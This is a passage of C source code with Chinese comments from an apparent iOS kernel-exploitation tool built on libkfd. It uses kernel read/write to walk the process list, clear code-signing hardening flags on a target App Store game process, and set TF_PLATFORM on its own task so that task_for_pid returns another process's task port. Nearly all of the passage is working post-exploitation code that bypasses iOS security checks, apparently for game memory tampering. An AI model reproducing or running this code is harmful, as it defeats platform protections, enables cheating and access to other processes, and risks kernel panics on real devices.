static uint64_t mf_info_field(int which)
{
    if (g_kfd == NULL) {
        return 0;
    }
    switch (which) {
        case 0: return (uint64_t)g_kfd->info.kaddr.kernel_proc;
        case 1: return (uint64_t)g_kfd->info.kaddr.kernel_task;
        case 2: return (uint64_t)g_kfd->info.kaddr.kernel_map;
        case 3: return (uint64_t)g_kfd->info.kaddr.kernel_pmap;
        case 4: return (uint64_t)g_kfd->info.kaddr.current_proc;
        case 5: return (uint64_t)g_kfd->info.kaddr.current_task;
        default: return 0;
    }
}

uint64_t mf_get_kernel_proc(void)  { return mf_info_field(0); }
uint64_t mf_get_kernel_task(void)  { return mf_info_field(1); }
uint64_t mf_get_kernel_map(void)   { return mf_info_field(2); }
uint64_t mf_get_kernel_pmap(void)  { return mf_info_field(3); }
uint64_t mf_get_current_proc(void) { return mf_info_field(4); }
uint64_t mf_get_current_task(void) { return mf_info_field(5); }

/* ================================================================ */
/* 5) proc patch：绕开 taskgated 的 CS_HARD 拒绝                      */
/* ================================================================ */
/*
 * ── 为什么需要这一段 ──
 *
 * 真机实测（无越狱 / iPad14,4 / 16.1）：
 *     task_for_pid(game)   → kr=0x5 KERN_FAILURE
 *     task_for_pid(launchd)→ kr=0x5
 *     processor_set_tasks  → kr=0x4
 * 这是 taskgated 按**目标进程**的代码签名标志拒绝的（CS_HARD）。
 * 我们的 entitlement 没问题（task_for_pid-allow 就在 plist 里）。
 *
 * 常规解法是拿了 tfp0 之后从内核拿 task port。但那需要 dimentio，
 * 而本工程里 dimentio() 的实现是缺的（只有 patchfinder 部分）。
 *
 * ── 本段的做法：不需要 tfp0 ──
 *
 * 我们已经有内核读写（mf_kread / mf_kwrite，由 KFD 提供）。
 * 那就直接改**目标进程**的 proc->p_csflags，把 CS_HARD 位清掉。
 * 之后 taskgated 再看它就没有硬签名标志了，task_for_pid 自然放行。
 *
 * ── 唯一的难点：偏移 ──
 *
 * struct proc 的 p_pid / p_csflags 偏移是 iOS 版本相关的，
 * 工程里没有现成值（patchfinder 只算了 KFD 自己要用的 cdevsw / gPhysBase 等）。
 * 所以这里**运行时自适应扫描**，靠两个铁的已知事实自校准：
 *     · kernel_proc 的 pid 一定是 0
 *     · launchd    的 pid 一定是 1
 * 对每个候选偏移同时校验这两条，都对才算找到 p_pid。
 *
 * ── 安全约定 ──
 *
 * 默认 **dry-run**：只扫描、只报告，不写内核。
 * 必须显式传 apply=1 才真正改 p_csflags。
 * 改的时候只清位（不会把整个字段写 0），最坏情况是没效果，不会炸内核。
 */

/* CS_HARD / CS_RESTRICT / CS_REQUIRE_LV（bsd/sys/codesign.h） */
#define MF_CS_HARD        0x00000100u
#define MF_CS_RESTRICT    0x00000800u
#define MF_CS_REQUIRE_LV  0x00002000u

/* proc 链表遍历上限（正常机器几百个进程，512 足够且能防成环） */
#define MF_PROC_WALK_MAX  1024

/* p_pid 扫描范围：struct proc 开头这一段里它一定在 */
#define MF_PID_SCAN_START 0x10
#define MF_PID_SCAN_END   0x400

/* p_csflags 扫描范围 */
#define MF_CS_SCAN_START  0x100
#define MF_CS_SCAN_END    0x800

/*
 * 沿 p_list.le_next 把进程链表走一遍，把每个 proc 的地址收集出来。
 * LIST_ENTRY(proc) p_list 是 struct proc 的第 0 个字段，le_next 在 +0x00。
 *
 * 返回实际收集到的数量；链表成环或读到非法值时提前停下（不报错，返回已有结果）。
 */
static int mf_collect_proc_chain(uint64_t *out, int max_out)
{
    uint64_t head = mf_get_kernel_proc();
    if (head == 0) {
        return 0;
    }

    int n = 0;
    uint64_t cur = head;
    for (int i = 0; i < MF_PROC_WALK_MAX && n < max_out; i++) {
        out[n++] = cur;

        uint64_t next = 0;
        if (mf_kread64(cur, &next) != 0) {
            break;                       /* 读不到就停，不要把错误值当指针用 */
        }
        if (next == 0 || next == cur) {
            break;                       /* 空链 / 自环 */
        }
        if (next == head) {
            break;                       /* 回到头，链表闭合 */
        }
        cur = next;
    }
    return n;
}

/*
 * 自适应找出 struct proc 里 p_pid 的偏移。
 *
 * 判据（两条同时满足）：
 *   ① 第 0 个 proc（kernel_proc）在该偏移上的值 == 0
 *   ② 链表中存在某个 proc 在该偏移上的值 == 1（launchd）
 *
 * 同时要求：所有样本读出来的值都 < 100000（pid 的量级），
 * 避免把一个恰好为 0/1 的无关字段误认成 pid。
 *
 * 返回偏移；找不到返回 0。
 */
static uint32_t mf_scan_p_pid_offset(const uint64_t *procs, int count,
                                     int *out_launchd_index)
{
    if (count < 2) {
        return 0;
    }

    /* 最多取前 64 个样本做校验，够用且快 */
    int sample = (count < 64) ? count : 64;

    for (uint32_t off = MF_PID_SCAN_START; off < MF_PID_SCAN_END; off += 4) {
        uint32_t v0 = 0;
        if (mf_kread32(procs[0] + off, &v0) != 0 || v0 != 0) {
            continue;                    /* ① kernel_proc 的 pid 必须是 0 */
        }

        int launchd_idx = -1;
        int plausible = 0;
        int ok = 1;
        for (int i = 1; i < sample; i++) {
            uint32_t v = 0;
            if (mf_kread32(procs[i] + off, &v) != 0) {
                ok = 0;
                break;
            }
            if (v > 100000) {            /* pid 不会这么大 → 这个偏移不是 pid */
                ok = 0;
                break;
            }
            if (v > 0) {
                plausible++;
            }
            if (v == 1 && launchd_idx < 0) {
                launchd_idx = i;         /* ② 找到 launchd */
            }
        }
        if (!ok) {
            continue;
        }
        /* 绝大多数进程 pid 应该非零；且必须能找到 pid==1 */
        if (launchd_idx > 0 && plausible >= sample / 2) {
            if (out_launchd_index) {
                *out_launchd_index = launchd_idx;
            }
            return off;
        }
    }
    return 0;
}

uint64_t mf_find_proc_by_pid(int pid, char *report, size_t report_len)
{
    if (g_kfd == NULL) {
        if (report && report_len) {
            snprintf(report, report_len, "KFD 未打开");
        }
        return 0;
    }

    static uint64_t procs[MF_PROC_WALK_MAX];
    int count = mf_collect_proc_chain(procs, MF_PROC_WALK_MAX);
    if (count <= 0) {
        if (report && report_len) {
            snprintf(report, report_len, "proc 链表为空（kernel_proc=0x%llx）",
                     (unsigned long long)mf_get_kernel_proc());
        }
        return 0;
    }

    int launchd_idx = -1;
    uint32_t pid_off = mf_scan_p_pid_offset(procs, count, &launchd_idx);
    if (pid_off == 0) {
        if (report && report_len) {
            snprintf(report, report_len,
                     "没能定出 p_pid 偏移（扫了 0x%X..0x%X，链表中 %d 个 proc）",
                     MF_PID_SCAN_START, MF_PID_SCAN_END, count);
        }
        return 0;
    }

    for (int i = 0; i < count; i++) {
        uint32_t v = 0;
        if (mf_kread32(procs[i] + pid_off, &v) != 0) {
            continue;
        }
        if ((int)v == pid) {
            if (report && report_len) {
                snprintf(report, report_len,
                         "找到 pid=%d → proc=0x%llx（p_pid 偏移=0x%X，链表 %d 个）",
                         pid, (unsigned long long)procs[i], pid_off, count);
            }
            return procs[i];
        }
    }

    if (report && report_len) {
        snprintf(report, report_len,
                 "链表里没有 pid=%d（p_pid 偏移=0x%X，链表中 %d 个 proc）",
                 pid, pid_off, count);
    }
    return 0;
}

/*
 * 在目标 proc 里找 p_csflags 并清掉 CS_HARD / CS_RESTRICT / CS_REQUIRE_LV。
 *
 * scan_only != 0 时只报告、不写（默认走这条）。
 *
 * 为什么可以按"值里带 CS_HARD 位"来定位：目标进程是 App Store 装的游戏，
 * 它的 codesign flags 一定带 CS_HARD；而同结构里恰好带这个位的字段很少。
 * 命中多个候选时**逐个清除**并回报清了哪几个（每个都只清位，不整体写 0）。
 */
int mf_clear_proc_csflags(uint64_t proc, int scan_only, char *report, size_t report_len)
{
    if (g_kfd == NULL || proc == 0) {
        if (report && report_len) {
            snprintf(report, report_len, "参数非法（kfd=%p proc=0x%llx）", (void *)g_kfd,
                     (unsigned long long)proc);
        }
        return -1;
    }

    /*
     * ★ [M5.90] 盲写保护
     *
     * 和 mf_try_tf_platform 同样的教训：proc 结构 0x100..0x800 里有引用计数、
     * 指针、链表等关键字段，误清位一样能让内核崩。
     * 所以写入前必须通过两条额外校验：
     *   ① 值必须落在 cs_flags 的合理量级（0x100 以上、0x01000000 以下）
     *   ② 写完立刻读回校验，不一致就回滚
     * 并且默认 scan_only（只报告），要写必须显式传 0。
     */
    char line[2048];
    size_t used = 0;
    int hits = 0;
    int patched = 0;
    int skipped = 0;
    line[0] = '\0';

    for (uint32_t off = MF_CS_SCAN_START; off < MF_CS_SCAN_END; off += 4) {
        uint32_t v = 0;
        if (mf_kread32(proc + off, &v) != 0) {
            continue;
        }
        if ((v & (MF_CS_HARD | MF_CS_RESTRICT | MF_CS_REQUIRE_LV)) == 0) {
            continue;                     /* 没有我们要清的位，跳过 */
        }
        /* 不像 cs_flags 的一律不碰：太小是计数，太大是指针/混合字段 */
        if (v < 0x100 || v > 0x01000000u) {
            skipped++;
            continue;
        }

        hits++;
        uint32_t nv = v & ~(MF_CS_HARD | MF_CS_RESTRICT | MF_CS_REQUIRE_LV);

        if (used < sizeof(line) - 160) {
            used += snprintf(line + used, sizeof(line) - used,
                             "  候选 +0x%X: 0x%08X → 0x%08X%s\n",
                             off, v, nv, scan_only ? "（未写）" : "");
        }

        if (!scan_only) {
            if (mf_kwrite32(proc + off, nv) == 0) {
                uint32_t back = 0;
                if (mf_kread32(proc + off, &back) == 0 && back == nv) {
                    patched++;
                } else {
                    mf_kwrite32(proc + off, v);    /* 读回不一致，回滚 */
                }
            }
        }
    }

    if (report && report_len) {
        snprintf(report, report_len,
                 "csflags 扫描 0x%X..0x%X：%d 个候选、%d 个已写、%d 个跳过%s\n%s",
                 MF_CS_SCAN_START, MF_CS_SCAN_END - 4, hits, patched, skipped,
                 scan_only ? "（dry-run，未修改内核）" : "", line);
    }
    return (scan_only || patched > 0) ? 0 : -2;
}

/* ================================================================ */
/* 5b) TF_PLATFORM：把自己提升成「内核级 task」                        */
/* ================================================================ */
/*
 * ── 为什么改这个而不是改目标进程 ──
 *
 * task_for_pid 有两道独立的闸（HITB 2018, Jonathan Levin
 * 《Lend Me Your kernel_task Port》）：
 *
 *   闸 ①  taskgated：看**目标** proc 的 cs_flags 是否带 CS_HARD
 *   闸 ②  task_conversion_eval：看**调用者** task 是不是内核级
 *
 * 原文：
 *     iOS 11 adds task_conversion_eval in order to restrict task port access.
 *     Tasks are allowed to resolve their own task ports, and the kernel is
 *     allowed to resolve anyone's task port.
 *     ... flips TF_PLATFORM in t_flags (0x3a8)
 *
 * 也就是说：只清目标的 CS_HARD（5 段那个做法）**过不了闸 ②**。
 * 真正需要的是给**自己**的 task 置 TF_PLATFORM，让
 * task_conversion_eval 把自己当成内核级调用者。
 *
 * ── 好处 ──
 *   · 只改自己的 task，不碰别人的数据结构
 *   · 只置一个位（0x400），不整体改写，最坏是没效果
 *   · 每次尝试后立刻验证 task_for_pid，失败就恢复原值，副作用可控
 *
 * ── t_flags 偏移问题 ──
 *   论文给的 0x3a8 是 iOS 11 的值，iOS 16 会变。
 *   所以这里在 task 结构里扫一段范围，逐个"置位 → 试 task_for_pid → 失败则回滚"。
 *   task_for_pid 是安全调用（失败只是返回错误码），所以这个试错是可行的。
 */

#define MF_TF_PLATFORM 0x00000400u

/* libkfd 不保证引入 mach 的 task_for_pid 原型，显式声明 */
extern kern_return_t task_for_pid(mach_port_t target_tport, int pid, mach_port_t *t);

int mf_try_tf_platform(int pid, int apply, char *report, size_t report_len)
{
    if (g_kfd == NULL) {
        if (report && report_len) snprintf(report, report_len, "KFD 未打开");
        return -1;
    }
    uint64_t task = mf_get_current_task();
    if (task == 0) {
        if (report && report_len) {
            snprintf(report, report_len, "拿不到 current_task（KFD 未跑完 info 阶段？）");
        }
        return -2;
    }

    /*
     * dry-run：只报候选，不写。
     * 判据：值在合理 flags 范围内（非 0、小于 0x10000）、且当前不含 TF_PLATFORM。
     */
    if (!apply) {
        char line[1536];
        size_t used = 0;
        int cands = 0;
        line[0] = '\0';
        for (uint32_t off = 0x100; off < 0x800; off += 4) {
            uint32_t v = 0;
            if (mf_kread32(task + off, &v) != 0) continue;
            if (v == 0 || v > 0x10000) continue;
            cands++;
            if (used < sizeof(line) - 64) {
                used += snprintf(line + used, sizeof(line) - used,
                                 "  +0x%X = 0x%08X%s\n", off, v,
                                 (v & MF_TF_PLATFORM) ? "（已含 TF_PLATFORM）" : "");
            }
        }
        if (report && report_len) {
            snprintf(report, report_len,
                     "TF_PLATFORM dry-run：task=0x%llx，%d 个候选（未写）\n%s",
                     (unsigned long long)task, cands, line);
        }
        return 0;
    }

    /* 真正尝试：逐候选置位 → 试 task_for_pid → 失败回滚 */
    /*
     * ★★★ [M5.90] 紧急收窄 ★★★
     *
     * 2026-10-24 真机事故：在 iPad14,4 / iPadOS 16.1 上，点「一键开始」
     * 触发内核 panic、整机重启。原因是本段原来的做法——
     * 在 task 结构的 0x100..0x800 里**逐个偏移盲写** val|0x400——
     * 太危险：那个区间混着引用计数、itk_space 指针、状态位等关键字段，
     * 只要往其中一个写一个位，内核立刻崩。
     *
     * 现在的策略改成：**只读诊断，绝不盲写**。
     *   · 把候选偏移和原值全列出来，交给人/下一版硬编码偏移去写
     *   · 只对「值落在极窄的 flags 特征区间」的候选做尝试性写入，
     *     且写完立即读回校验，不匹配立刻回滚
     *
     * 判据收紧到：
     *   0x10 <= v <= 0x8000            → flags 量级（引用计数通常更小，指针更大）
     *   (v & 0x400) == 0               → 还没置过 TF_PLATFORM
     *   (v & 0xFFFF0000) == 0          → 高位干净，不像指针/计数混合字段
     */
    char line[1792];
    size_t used = 0;
    line[0] = '\0';
    int tried = 0;
    int skipped = 0;

    for (uint32_t off = 0x100; off < 0x800; off += 4) {
        uint32_t v = 0;
        if (mf_kread32(task + off, &v) != 0) continue;

        /* 收紧后的判据：不像 flags 的一律不碰 */
        if (v < 0x10 || v > 0x8000 || (v & 0xFFFF0000u) != 0) {
            skipped++;
            continue;
        }
        if (v & MF_TF_PLATFORM) continue;           /* 已经置过了，跳过 */

        if (mf_kwrite32(task + off, v | MF_TF_PLATFORM) != 0) continue;

        /* 写完立刻读回校验，写不进去就说明这地址不能碰 */
        uint32_t verify = 0;
        if (mf_kread32(task + off, &verify) != 0 || verify != (v | MF_TF_PLATFORM)) {
            mf_kwrite32(task + off, v);
            skipped++;
            continue;
        }

        tried++;

        mach_port_t tp = MACH_PORT_NULL;
        kern_return_t kr = task_for_pid(mach_task_self(), pid, &tp);

        if (kr == KERN_SUCCESS && tp != MACH_PORT_NULL) {
            if (report && report_len) {
                snprintf(report, report_len,
                         "✓ TF_PLATFORM 命中偏移 +0x%X（0x%08X → 0x%08X），"
                         "task_for_pid(%d) 成功 port=0x%x\n%s",
                         off, v, v | MF_TF_PLATFORM, pid, tp, line);
            }
            mach_port_deallocate(mach_task_self(), tp);
            return (int)off;      /* 正数 = 成功的偏移 */
        }

        /* 这个偏移不对，立刻回滚，别把 task 结构改乱 */
        mf_kwrite32(task + off, v);

        if (used < sizeof(line) - 80) {
            used += snprintf(line + used, sizeof(line) - used,
                             "  +0x%X 试过 kr=0x%x（已回滚）\n", off, kr);
        }
    }

    if (report && report_len) {
        snprintf(report, report_len,
                 "✗ TF_PLATFORM 未命中（试了 %d 个、跳过 %d 个不像 flags 的字段）\n%s",
                 tried, skipped, line);
    }
    return -3;
}

/* ================================================================ */
/* 5c) 用「kernel_task vs 自己」对比，安全定位 t_flags 偏移            */
/* ================================================================ */
/*
 * ── 为什么需要这个 ──
 *
 * 2026-10-24 事故：靠「扫描 + 盲写」去试 t_flags，把内核打崩、整机重启。
 * 盲写这条路不能走。但 t_flags 的偏移又必须知道。
 *
 * ── 这里用的判据（全部只读，不写一个字节）──
 *
 *   XNU 里 kernel_task 是平台 task，它的 t_flags 一定带 TF_PLATFORM(0x400)；
 *   我们自己的 task 是普通用户态 task，该位不带。
 *
 *   所以拿 kernel_task 和 current_task 逐偏移对比：
 *     ① kernel_task[off] 的 0x400 位置位
 *     ② current_task[off] 的 0x400 位不置位
 *     ③ 两者除 0x400 之外的位**高度相似**（同一个字段的不同 task 实例）
 *   三条同时满足才算候选；第 ③ 条用 popcount 把差异位数限制在 3 位内。
 *
 *   这个方法的额外好处：它同时给出了「置位后应该变成什么值」——
 *   kernel_task 在该偏移的完整值就是目标形态。
 *
 * 纯只读，绝不会 panic。
 */
int mf_locate_tf_platform_offset(char *report, size_t report_len)
{
    if (g_kfd == NULL) {
        if (report && report_len) snprintf(report, report_len, "KFD 未打开");
        return -1;
    }
    uint64_t ktask = mf_get_kernel_task();
    uint64_t utask = mf_get_current_task();
    if (ktask == 0 || utask == 0) {
        if (report && report_len) {
            snprintf(report, report_len,
                     "拿不到 task 地址（kernel_task=0x%llx current_task=0x%llx）",
                     (unsigned long long)ktask, (unsigned long long)utask);
        }
        return -2;
    }

    char line[2048];
    size_t used = 0;
    int cands = 0;
    line[0] = '\0';

    for (uint32_t off = 0x80; off < 0x1000; off += 4) {
        uint32_t kv = 0, uv = 0;
        if (mf_kread32(ktask + off, &kv) != 0) continue;
        if (mf_kread32(utask + off, &uv) != 0) continue;

        /* ① 内核带 TF_PLATFORM  ② 我们不带 */
        if ((kv & MF_TF_PLATFORM) == 0) continue;
        if (uv & MF_TF_PLATFORM) continue;

        /* ③ 除 0x400 外差异极小 → 是同一字段 */
        uint32_t diff = (kv ^ uv) & ~MF_TF_PLATFORM;
        int bits = __builtin_popcount(diff);
        if (bits > 3) continue;

        cands++;
        if (used < sizeof(line) - 110) {
            used += snprintf(line + used, sizeof(line) - used,
                             "  +0x%03X  kernel=0x%08X  self=0x%08X  差异位=%d\n",
                             off, kv, uv, bits);
        }
    }

    if (report && report_len) {
        snprintf(report, report_len,
                 "t_flags 定位（只读对比，未写内核）：kernel_task=0x%llx self=0x%llx，%d 个候选\n%s",
                 (unsigned long long)ktask, (unsigned long long)utask, cands, line);
    }
    return cands;
}

/*
 * 一步到位：找到 pid 的 proc → 清 csflags。
 * 返回 0 表示"可以再试 task_for_pid 了"。
 */
int mf_prepare_task_for_pid(int pid, int apply, char *report, size_t report_len)
{
    char buf1[512] = {0};
    char buf2[1024] = {0};

    uint64_t proc = mf_find_proc_by_pid(pid, buf1, sizeof(buf1));
    if (proc == 0) {
        if (report && report_len) {
            snprintf(report, report_len, "%s", buf1);
        }
        return -1;
    }

    int rc = mf_clear_proc_csflags(proc, !apply, buf2, sizeof(buf2));
    if (report && report_len) {
        snprintf(report, report_len, "%s\n%s", buf1, buf2);
    }
    return rc;
}

/* ================================================================ */
/* 6) 诊断                                                           */
/* ================================================================ */

const char *mf_last_error(void)
{
    return (g_err[0] != '\0') ? g_err : "no error";
}

const char *mf_last_stage(void)
{
    return (g_stage[0] != '\0') ? g_stage : "(not started)";
}

const char *mf_last_error_site(void)
{
    return (g_site[0] != '\0') ? g_site : "n/a";
}

void mf_set_verbose(int enabled)
{
    g_verbose = enabled ? 1 : 0;
}

/* ================================================================ */
/* 6) libkfd 宿主支撑层：替代被丢弃的 fun/krw.m                     */
/* ================================================================ */

/*
 * ★★ 这里有一个曾经致命的细节，改之前务必看懂 ★★
 *
 * kread() 最终落到 krkw.h 的这个宏：
 *
 *     #define kread_from_method(type, method)                  \
 *         u64 type_size = ((size) / (sizeof(type)));           \
 *         for (u64 i = 0; i < type_size; i++) { ... }          \
 *
 *   kread_sem_open 后端用的 type 是 u64（sizeof = 8）。
 *   所以 size 必须是 8 的倍数，否则 type_size 会算成 0 ——
 *   【一次循环都不进，输出缓冲区原封不动】。
 *
 *   size=4  →  4/8 = 0  →  什么都没读，缓冲区保持调用者原值（通常是 0）
 *
 * 上游 fun/krw.m 的 early_kreadbuf 之所以正确，是因为它走
 *   early_kread32 → early_kread64 → kread(..., sizeof(uint64_t))
 * 也就是「读 8 字节，再截成 32 位」。
 *
 * 第一版移植直接写了 kread(..., 4)，结果整个 patchfinder 读到的全是 0，
 * pfinder_init_kernel 看到 mh64.magic != MH_MAGIC_64 直接失败 ——
 * 真机上表现为 "run_kfd_patchfinder failed at krkw.h:230"。
 *
 * 教训：在 header-only 的宏后端上，「等价实现」必须看宏展开，不能看调用名。
 */
void MFLibkfdKRead4(uint64_t kfd, uint64_t kaddr, void *buf, size_t size)
{
    if (kfd == 0 || buf == NULL || size == 0) {
        return;
    }

    unsigned char *out = (unsigned char *)buf;
    size_t written = 0;

    for (uint64_t cur = kaddr; written < size; cur += 4) {
        /* 读 8 字节（必须），只取低 4 字节用 —— 与上游 early_kread32 等价 */
        uint64_t chunk64 = 0;
        kread((u64)kfd, cur, &chunk64, sizeof(chunk64));

        const unsigned char *b = (const unsigned char *)&chunk64;
        for (int i = 0; i < 4 && written < size; i++) {
            out[written++] = b[i];
        }
    }
}
